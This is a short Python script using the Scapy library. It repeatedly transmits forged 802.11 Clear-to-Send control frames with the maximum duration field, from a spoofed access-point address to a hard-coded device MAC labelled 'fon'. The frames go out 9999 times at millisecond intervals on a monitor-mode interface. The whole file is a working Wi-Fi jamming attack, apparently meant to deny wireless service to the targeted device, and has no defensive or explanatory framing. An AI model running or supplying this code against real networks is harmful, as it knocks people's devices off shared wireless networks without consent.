from scapy.all import *

target = "FE:DE:90:A4:A0:FF"  # fon
bssid = "9C:B6:D0:8C:03:4B"


def write(pkt):
    wrpcap("cts.pcap", pkt, append=True)  # appends packet to output file


if __name__ == "__main__":
    # https://en.wikipedia.org/wiki/802.11_Frame_Types

    packet = RadioTap() / Dot11(
        type=1, subtype=28, addr1=target, addr2=bssid, addr3=bssid, ID=65535
    )

    # write(pkt=packet)
    sendp(packet, iface="wlan0mon", count=9999, inter=0.001)
